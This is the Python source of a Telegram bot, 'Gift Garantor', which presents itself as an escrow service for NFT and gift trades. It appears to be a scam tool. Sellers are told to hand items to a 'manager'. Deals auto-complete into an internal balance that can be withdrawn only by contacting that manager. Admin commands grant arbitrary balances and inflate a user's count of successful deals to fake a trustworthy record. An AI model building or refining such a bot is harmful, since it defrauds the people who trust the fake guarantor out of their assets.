import asyncio
import random
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command, StateFilter
from aiogram.fsm.context import FSMContext
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import FSInputFile

from config import BOT_TOKEN, ADMIN_IDS, SUPPORT_LINK, MANAGER_LINK, PHOTO_PATH
from database import (
    init_db, get_user, update_user_balance, update_user_deals_success,
    update_user_details, delete_user_details, get_next_deal_number,
    create_deal, get_deal_by_number,
    join_deal as db_join_deal,  # FIX: переименовываем чтобы не конфликтовало с хендлером join_deal
    update_deal_status, get_user_deals, complete_deal, get_user_rekv
)
from states import *
from keyboards import *

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

# FIX: кэшируем username бота при старте
bot_username = None

# Отправка фото
async def send_with_photo(chat_id, caption, reply_markup=None):
    photo = FSInputFile(PHOTO_PATH)
    await bot.send_photo(chat_id, photo, caption=caption, reply_markup=reply_markup, parse_mode="HTML")

# Приветствие
@dp.message(Command("start"))
async def cmd_start(message: types.Message, state: FSMContext = None):
    if state:
        await state.clear()
    get_user(message.from_user.id)

    # FIX: обработка deep link ?start=deal_NNN
    args = message.text.split(maxsplit=1)
    if len(args) > 1 and args[1].startswith("deal_"):
        try:
            deal_number = int(args[1].split("_")[1])
            deal = get_deal_by_number(deal_number)
            if deal and deal['status'] == "waiting_buyer" and deal['seller_id'] != message.from_user.id:
                db_join_deal(deal_number, message.from_user.id)
                rekv = get_user_rekv(deal['seller_id'], deal['currency'])
                await message.answer(
                    f"✅ <b>Вы вступили в сделку #{deal_number}!</b>\n\n"
                    f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
                    f"📦 Описание: {deal['description']}\n\n"
                    f"💳 <b>Реквизиты продавца:</b>\n{rekv}\n\n"
                    f"1️⃣ Переведите точную сумму\n"
                    f"2️⃣ Нажмите кнопку «Я оплатил»\n\n"
                    f"⚠️ Без подтверждения сделка не будет выполнена!",
                    reply_markup=payment_confirmation_kb(),
                    parse_mode="HTML"
                )
                await bot.send_message(
                    deal['seller_id'],
                    f"🔄 <b>Новый покупатель в сделке #{deal_number}!</b>\n"
                    f"Сумма: {deal['amount']} {deal['currency']}\n"
                    f"Покупатель: @{message.from_user.username or message.from_user.id}\n"
                    f"Ожидайте подтверждения оплаты.",
                    parse_mode="HTML"
                )
                return
            elif deal and deal['seller_id'] == message.from_user.id:
                await message.answer("❌ Вы не можете купить собственную сделку!")
            elif not deal or deal['status'] != "waiting_buyer":
                await message.answer("❌ Сделка не найдена или уже закрыта!")
        except Exception:
            pass

    await send_with_photo(
        message.chat.id,
        "💼 <b>Добро пожаловать в Gift Garantor 🤝</b>\n\n"
        "⚡️ <b>Ваш надёжный P2P-гарант:</b>\n"
        "1️⃣ Автоматические сделки с NFT и подарками\n"
        "2️⃣ 🛡 Полная защита обеих сторон\n"
        "3️⃣ 🪙 Быстрые выплаты\n"
        "4️⃣ 📦 Передача товаров через менеджера:\n"
        f"{SUPPORT_LINK}\n\n"
        "💡 <b>Выберите действие ниже</b> ⬇️",
        main_menu()
    )

    if message.from_user.id in ADMIN_IDS:
        await message.answer("👑 Админ панель доступна", reply_markup=admin_panel_kb())

# Баланс
@dp.message(F.text == "💰 баланс")
async def show_balance(message: types.Message):
    user = get_user(message.from_user.id)
    await send_with_photo(
        message.chat.id,
        "💼 <b>Ваш баланс:</b>\n"
        f"USDT: {user['usdt_balance']:.2f}\n"
        f"RUB: {user['rub_balance']:.2f}\n"
        f"TON: {user['ton_balance']:.2f}\n"
        f"STAR: {user['star_balance']:.2f}\n\n"
        f"📊 <b>Успешных сделок:</b> {user['deals_success']}\n\n"
        "◀️ Назад в меню",
        back_menu()
    )

# Назад в меню
@dp.message(F.text == "◀️ Назад в меню")
async def back_to_menu(message: types.Message, state: FSMContext):
    await state.clear()
    await cmd_start(message)

# Создать сделку
@dp.message(F.text == "📝 Создать сделку")
async def create_deal_start(message: types.Message, state: FSMContext):
    await state.set_state(CreateDealStates.role)
    await message.answer(
        "💼 <b>Новая сделка</b>\n\n"
        "💭 <b>Кем вы выступаете в данной сделке?</b>\n\n"
        "👑 <b>Продавец</b> — вы продаёте товар/услугу и получаете оплату.\n"
        "🛒 <b>Покупатель</b> — вы платите и получаете товар/услугу.",
        reply_markup=role_buttons(),
        parse_mode="HTML"
    )

# Выбор роли
@dp.callback_query(F.data.startswith("role_"))
async def select_role(callback: types.CallbackQuery, state: FSMContext):
    role = "seller" if callback.data == "role_seller" else "buyer"
    await state.update_data(role=role)

    await callback.message.answer(
        f"<b>Ваша роль: {'Продавец' if role == 'seller' else 'Покупатель'}</b>\n\n"
        "1️⃣ <b>Способ получения оплаты:</b>\n\n"
        "💭 <b>Как покупатель переведёт средства?</b>\n\n"
        "💡 <b>Выберите действие ниже</b> ⬇️",
        reply_markup=currency_buttons(),
        parse_mode="HTML"
    )
    await state.set_state(CreateDealStates.currency)
    await callback.answer()

# Выбор валюты
@dp.callback_query(F.data.startswith("cur_"), StateFilter(CreateDealStates.currency))
async def select_currency(callback: types.CallbackQuery, state: FSMContext):
    currency = callback.data.split("_")[1]
    await state.update_data(currency=currency)
    await callback.message.answer(f"<b>Валюта:</b> {currency}\n\n✍️ <b>Введите сумму сделки</b>", parse_mode="HTML")
    await state.set_state(CreateDealStates.amount)
    await callback.answer()

# Ввод суммы
@dp.message(StateFilter(CreateDealStates.amount))
async def enter_amount(message: types.Message, state: FSMContext):
    try:
        amount = float(message.text.replace(",", "."))
        await state.update_data(amount=amount)
        await message.answer(
            "💬 <b>Опишите предмет сделки:</b>\n\n"
            "Например https://t.me/nft/PlushPepe-111\n"
            "или просто текстовое описание товара",
            parse_mode="HTML"
        )
        await state.set_state(CreateDealStates.description)
    except Exception:
        await message.answer("❌ Введите число! Например: 100 или 1.5")

# Ввод описания + создание сделки
@dp.message(StateFilter(CreateDealStates.description))
async def enter_description(message: types.Message, state: FSMContext):
    data = await state.get_data()
    role = data['role']
    currency = data['currency']
    amount = data['amount']
    description = message.text

    if role == "seller":
        rekv = get_user_rekv(message.from_user.id, currency)
        if not rekv:
            await message.answer(
                "❌ <b>Реквизиты не указаны</b>\n\nСначала добавьте реквизиты для получения оплаты:",
                reply_markup=rekv_types(),
                parse_mode="HTML"
            )
            await state.clear()
            return

        deal_number = get_next_deal_number()
        create_deal(message.from_user.id, amount, currency, description, role, deal_number)

        # FIX: получаем username бота правильно
        me = await bot.get_me()
        await message.answer(
            f"✅ <b>Сделка #{deal_number} Успешно создана</b>\n\n"
            f"💬 Роль: Продавец\n"
            f"💼 Валюта: {currency}\n"
            f"💰 Сумма: {amount}\n"
            f"✍️ Описание: {description}\n\n"
            f"🔗 <b>Отправьте ссылку второй стороне:</b>\n"
            f"<code>https://t.me/{me.username}?start=deal_{deal_number}</code>",
            reply_markup=cancel_deal_kb(deal_number),
            parse_mode="HTML"
        )
    else:
        # Покупатель вводит номер сделки
        await state.update_data(description=description)
        await message.answer(
            "🔗 <b>Введите номер сделки</b> (который дал продавец):\n"
            "Пример: <code>168</code>",
            reply_markup=back_menu(),
            parse_mode="HTML"
        )
        await state.set_state(JoinDealStates.enter_number)
        return  # FIX: не очищаем стейт здесь, нужен для следующего шага

    await state.clear()

# Отмена сделки продавцом
@dp.callback_query(F.data.startswith("cancel_deal_"))
async def cancel_deal(callback: types.CallbackQuery):
    deal_number = int(callback.data.split("_")[2])
    deal = get_deal_by_number(deal_number)

    if not deal:
        await callback.answer("❌ Сделка не найдена!", show_alert=True)
        return

    if deal['seller_id'] != callback.from_user.id:
        await callback.answer("❌ Это не ваша сделка!", show_alert=True)
        return

    if deal['status'] not in ("waiting_buyer",):
        await callback.answer("❌ Сделку нельзя отменить — покупатель уже вступил!", show_alert=True)
        return

    update_deal_status(deal_number, "cancelled")
    await callback.message.edit_reply_markup(reply_markup=None)
    await callback.message.answer(
        f"❌ <b>Сделка #{deal_number} отменена.</b>",
        reply_markup=main_menu(),
        parse_mode="HTML"
    )
    await callback.answer()


@dp.message(StateFilter(JoinDealStates.enter_number))
async def handle_join_deal(message: types.Message, state: FSMContext):  # FIX: переименован хендлер
    try:
        deal_number = int(message.text.strip())
    except Exception:
        await message.answer("❌ Введите номер сделки (только цифры)!")
        return

    deal = get_deal_by_number(deal_number)

    if not deal or deal['status'] != "waiting_buyer":
        await message.answer("❌ Сделка не найдена или уже закрыта!", reply_markup=main_menu())
        await state.clear()
        return

    if deal['seller_id'] == message.from_user.id:
        await message.answer("❌ Вы не можете купить собственную сделку!", reply_markup=main_menu())
        await state.clear()
        return

    db_join_deal(deal_number, message.from_user.id)  # FIX: используем db_join_deal

    rekv = get_user_rekv(deal['seller_id'], deal['currency'])

    await message.answer(
        f"✅ <b>Вы вступили в сделку #{deal_number}!</b>\n\n"
        f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
        f"📦 Описание: {deal['description']}\n\n"
        f"💳 <b>Реквизиты продавца:</b>\n{rekv}\n\n"
        f"1️⃣ Переведите точную сумму\n"
        f"2️⃣ Нажмите кнопку «Я оплатил»\n\n"
        f"⚠️ Без подтверждения сделка не будет выполнена!",
        reply_markup=payment_confirmation_kb(),
        parse_mode="HTML"
    )

    await bot.send_message(
        deal['seller_id'],
        f"🔄 <b>Новый покупатель в сделке #{deal_number}!</b>\n"
        f"Сумма: {deal['amount']} {deal['currency']}\n"
        f"Покупатель: @{message.from_user.username or message.from_user.id}\n"
        f"Ожидайте подтверждения оплаты.",
        parse_mode="HTML"
    )
    await state.clear()

# Я оплатил
@dp.message(F.text == "✅ Я оплатил")
async def payment_confirmed(message: types.Message):
    deals = get_user_deals(message.from_user.id)
    active_deal = None
    for d in deals:
        # d[7]=status, d[3]=buyer_id
        if d[7] == "waiting_payment" and d[3] == message.from_user.id:
            active_deal = d
            break

    if not active_deal:
        await message.answer("❌ У вас нет активных сделок в статусе ожидания оплаты!")
        return

    deal_number = active_deal[1]
    update_deal_status(deal_number, "payment_confirmed")

    seller_id = active_deal[2]
    await bot.send_message(
        seller_id,
        f"💰 <b>Покупатель подтвердил оплату в сделке #{deal_number}!</b>\n"
        f"Сумма: {active_deal[4]} {active_deal[5]}\n\n"
        f"📦 <b>Передайте товар через менеджера:</b> {MANAGER_LINK}\n"
        f"После передачи нажмите кнопку «Товар передан»",
        reply_markup=product_sent_kb(),
        parse_mode="HTML"
    )

    await message.answer("✅ Оплата подтверждена! Продавец скоро свяжется с вами.", reply_markup=main_menu())

# Товар передан
@dp.message(F.text == "📦 Товар передан")
async def product_sent(message: types.Message):
    deals = get_user_deals(message.from_user.id)
    active_deal = None
    for d in deals:
        # d[7]=status, d[2]=seller_id
        if d[7] == "payment_confirmed" and d[2] == message.from_user.id:
            active_deal = d
            break

    if not active_deal:
        await message.answer("❌ Нет активной сделки для подтверждения передачи!")
        return

    deal_number = active_deal[1]
    update_deal_status(deal_number, "ready_to_complete")

    for admin_id in ADMIN_IDS:
        try:
            await bot.send_message(
                admin_id,
                f"🛡 <b>Сделка #{deal_number} готова к завершению!</b>\n"
                f"Продавец: {active_deal[2]}\n"
                f"Покупатель: {active_deal[3]}\n"
                f"Сумма: {active_deal[4]} {active_deal[5]}",
                parse_mode="HTML"
            )
        except Exception:
            pass

    result = complete_deal(deal_number)
    if result:
        try:
            await bot.send_message(result[0], f"✅ Сделка #{deal_number} завершена! Баланс пополнен на {result[2]} {result[3]}")
        except Exception:
            pass
        try:
            await bot.send_message(result[1], f"✅ Сделка #{deal_number} завершена! Товар получен.")
        except Exception:
            pass

    await message.answer("✅ Сделка завершена!", reply_markup=main_menu())

# Мои сделки
@dp.message(F.text == "📋 Мои сделки")
async def my_deals(message: types.Message):
    deals = get_user_deals(message.from_user.id)
    if not deals:
        await message.answer("📭 У вас пока нет сделок.", reply_markup=main_menu())
        return

    text = "<b>📋 Ваши сделки:</b>\n\n"
    for d in deals:
        role = "👑 Продавец" if d[2] == message.from_user.id else "🛒 Покупатель"
        status_text = {
            "waiting_buyer": "⏳ Ожидает покупателя",
            "waiting_payment": "💸 Ожидает оплаты",
            "payment_confirmed": "✅ Оплачено",
            "ready_to_complete": "📦 Готово к завершению",
            "completed": "✔️ Завершена"
        }.get(d[7], d[7])
        text += f"🔹 Сделка #{d[1]} | {role} | {d[4]} {d[5]} | {status_text}\n"

    await message.answer(text, parse_mode="HTML", reply_markup=main_menu())

# Помощь
@dp.message(F.text == "❓ Помощь")
async def help_msg(message: types.Message):
    await message.answer(
        "📖 <b>Как работает Gift Garantor:</b>\n\n"
        "1️⃣ Продавец создаёт сделку → получает номер сделки\n"
        "2️⃣ Покупатель вводит номер сделки\n"
        "3️⃣ Покупатель оплачивает на реквизиты продавца\n"
        "4️⃣ Продавец передаёт товар через менеджера\n"
        "5️⃣ Администратор завершает сделку\n\n"
        "💡 <b>Создайте сделку, выбрав роль и валюту.</b>\n"
        "Поделитесь номером сделки. Покупатель платит первым, "
        "затем продавец передаёт NFT через менеджера и запрашивает подтверждение.\n"
        "Администратор завершает сделку.",
        reply_markup=main_menu(),
        parse_mode="HTML"
    )

# Вывод средств
@dp.message(F.text == "💸 Вывод")
async def withdraw(message: types.Message):
    await message.answer(
        "💸 <b>ВЫВОД СРЕДСТВ</b>\n\n"
        f"Для вывода средств обратитесь к менеджеру:\n\n"
        f"👨‍💻 <b>Менеджер:</b> {MANAGER_LINK}\n\n"
        f"💰 Комиссия за вывод: 0%",
        reply_markup=main_menu(),
        parse_mode="HTML"
    )

# Техподдержка
@dp.message(F.text == "🛠 Тех.поддержка")
async def support(message: types.Message):
    await message.answer(f"📞 Свяжитесь с нами: {SUPPORT_LINK}", reply_markup=main_menu())

# ==================== РЕКВИЗИТЫ ====================
@dp.message(F.text == "🏦 Реквизиты")
async def rekv_menu(message: types.Message, state: FSMContext):
    await message.answer("Выберите тип реквизитов:", reply_markup=rekv_types())
    await state.set_state(RekvStates.choose_type)

@dp.callback_query(F.data.startswith("rekv_"), StateFilter(RekvStates.choose_type))
async def choose_rekv_type(callback: types.CallbackQuery, state: FSMContext):
    if callback.data == "rekv_back":
        await cmd_start(callback.message)
        await state.clear()
        await callback.answer()
        return

    currency = callback.data.split("_")[1]
    existing_rekv = get_user_rekv(callback.from_user.id, currency)

    type_names = {"RUB": "💳 Карта", "USDT": "💵 Кошелек USDT", "TON": "🪙 Криптокошелек TON", "STAR": "⭐ Username (STARS)"}
    hints = {
        "RUB":  "💳 <b>Введите реквизиты карты для получения RUB</b>\n\nПример: <code>1234 5678 9012 3456</code>",
        "USDT": "💵 <b>Введите кошелек USDT (TRC20)</b>\n\nПример: <code>TXxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</code>",
        "TON":  "🪙 <b>Введите криптокошелек TON</b>\n\nПример: <code>UQCxxxxxxxxxx</code>",
        "STAR": "⭐ <b>Введите Username для получения Stars</b>\n\nПример: <code>@username</code>",
    }

    if existing_rekv:
        await callback.message.answer(
            f"🏦 <b>Ваши текущие реквизиты:</b>\n\n"
            f"Тип: {type_names.get(currency, currency)}\n"
            f"Реквизиты: {existing_rekv}\n\n"
            f"Что хотите сделать?",
            reply_markup=rekv_manage_buttons(currency, True),
            parse_mode="HTML"
        )
        await state.update_data(currency=currency)
        await state.set_state(RekvStates.manage)
    else:
        await callback.message.answer(
            hints.get(currency, "Введите реквизиты:"),
            reply_markup=back_menu(),
            parse_mode="HTML"
        )
        await state.update_data(currency=currency)
        await state.set_state(RekvStates.enter_details)

    await callback.answer()

REKV_HINTS = {
    "RUB":  "💳 <b>Введите реквизиты карты для получения RUB</b>\n\nПример: <code>1234 5678 9012 3456</code>",
    "USDT": "💵 <b>Введите кошелек USDT (TRC20)</b>\n\nПример: <code>TXxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</code>",
    "TON":  "🪙 <b>Введите криптокошелек TON</b>\n\nПример: <code>UQCxxxxxxxxxx</code>",
    "STAR": "⭐ <b>Введите Username для получения Stars</b>\n\nПример: <code>@username</code>",
}

@dp.callback_query(F.data.startswith("rekv_edit_"), StateFilter(RekvStates.manage))
async def edit_rekv(callback: types.CallbackQuery, state: FSMContext):
    currency = callback.data.split("_")[2]
    await state.update_data(currency=currency)
    await callback.message.answer(REKV_HINTS.get(currency, "Введите новые реквизиты:"), reply_markup=back_menu(), parse_mode="HTML")
    await state.set_state(RekvStates.enter_details)
    await callback.answer()

@dp.callback_query(F.data.startswith("rekv_delete_"), StateFilter(RekvStates.manage))
async def delete_rekv(callback: types.CallbackQuery, state: FSMContext):
    currency = callback.data.split("_")[2]
    delete_user_details(callback.from_user.id, currency)
    await callback.message.answer("✅ Реквизиты удалены!", reply_markup=main_menu())
    await state.clear()
    await callback.answer()

@dp.callback_query(F.data == "rekv_back_main", StateFilter(RekvStates.manage))
async def back_from_manage(callback: types.CallbackQuery, state: FSMContext):
    await cmd_start(callback.message)
    await state.clear()
    await callback.answer()

@dp.message(StateFilter(RekvStates.enter_details))
async def save_rekv(message: types.Message, state: FSMContext):
    data = await state.get_data()
    currency = data['currency']
    update_user_details(message.from_user.id, currency, message.text)
    type_names = {"RUB": "💳 Карта (RUB)", "USDT": "💵 Кошелек USDT", "TON": "🪙 Криптокошелек TON", "STAR": "⭐ Username (STARS)"}
    await message.answer(
        f"🏦 <b>Реквизиты сохранены!</b>\n\n"
        f"Тип: {type_names.get(currency, currency)}\n"
        f"Реквизиты: {message.text}",
        reply_markup=main_menu(),
        parse_mode="HTML"
    )
    await state.clear()

# ==================== АДМИН ПАНЕЛЬ ====================
@dp.message(F.text == "👑 Админ панель")
async def admin_panel(message: types.Message):
    if message.from_user.id not in ADMIN_IDS:
        await message.answer("❌ Доступ запрещён!")
        return

    await message.answer(
        "👑 <b>Админ панель</b>\n\n"
        "Доступные команды (ответьте на сообщение пользователя):\n"
        "<code>/set_star <кол-во></code> - выдать звёзды\n"
        "<code>/set_ton <кол-во></code> - выдать TON\n"
        "<code>/set_rub <кол-во></code> - выдать RUB\n"
        "<code>/set_usdt <кол-во></code> - выдать USDT\n"
        "<code>/set_deals <кол-во></code> - накрутить сделки",
        parse_mode="HTML"
    )

@dp.message(Command("set_star"))
async def set_star(message: types.Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    try:
        parts = message.text.split()
        if len(parts) != 2:
            await message.answer("❌ Используйте: /set_star <кол-во>")
            return
        amount = float(parts[1])
        if message.reply_to_message:
            user_id = message.reply_to_message.from_user.id
            update_user_balance(user_id, "STAR", amount)
            await message.answer(f"✅ Выдано {amount} STAR пользователю {user_id}")
        else:
            await message.answer("❌ Ответьте на сообщение пользователя")
    except Exception:
        await message.answer("❌ Ошибка!")

@dp.message(Command("set_ton"))
async def set_ton(message: types.Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    try:
        parts = message.text.split()
        if len(parts) != 2:
            await message.answer("❌ Используйте: /set_ton <кол-во>")
            return
        amount = float(parts[1])
        if message.reply_to_message:
            user_id = message.reply_to_message.from_user.id
            update_user_balance(user_id, "TON", amount)
            await message.answer(f"✅ Выдано {amount} TON пользователю {user_id}")
        else:
            await message.answer("❌ Ответьте на сообщение пользователя")
    except Exception:
        await message.answer("❌ Ошибка!")

@dp.message(Command("set_rub"))
async def set_rub(message: types.Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    try:
        parts = message.text.split()
        if len(parts) != 2:
            await message.answer("❌ Используйте: /set_rub <кол-во>")
            return
        amount = float(parts[1])
        if message.reply_to_message:
            user_id = message.reply_to_message.from_user.id
            update_user_balance(user_id, "RUB", amount)
            await message.answer(f"✅ Выдано {amount} RUB пользователю {user_id}")
        else:
            await message.answer("❌ Ответьте на сообщение пользователя")
    except Exception:
        await message.answer("❌ Ошибка!")

@dp.message(Command("set_usdt"))
async def set_usdt(message: types.Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    try:
        parts = message.text.split()
        if len(parts) != 2:
            await message.answer("❌ Используйте: /set_usdt <кол-во>")
            return
        amount = float(parts[1])
        if message.reply_to_message:
            user_id = message.reply_to_message.from_user.id
            update_user_balance(user_id, "USDT", amount)
            await message.answer(f"✅ Выдано {amount} USDT пользователю {user_id}")
        else:
            await message.answer("❌ Ответьте на сообщение пользователя")
    except Exception:
        await message.answer("❌ Ошибка!")

@dp.message(Command("set_deals"))
async def set_deals(message: types.Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    try:
        parts = message.text.split()
        if len(parts) != 2:
            await message.answer("❌ Используйте: /set_deals <кол-во>")
            return
        amount = int(parts[1])
        if message.reply_to_message:
            user_id = message.reply_to_message.from_user.id
            update_user_deals_success(user_id, amount)
            await message.answer(f"✅ Накручено {amount} сделок пользователю {user_id}")
        else:
            await message.answer("❌ Ответьте на сообщение пользователя")
    except Exception:
        await message.answer("❌ Ошибка!")

# Запуск
async def main():
    init_db()
    print("Бот Gift Garantor запущен!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
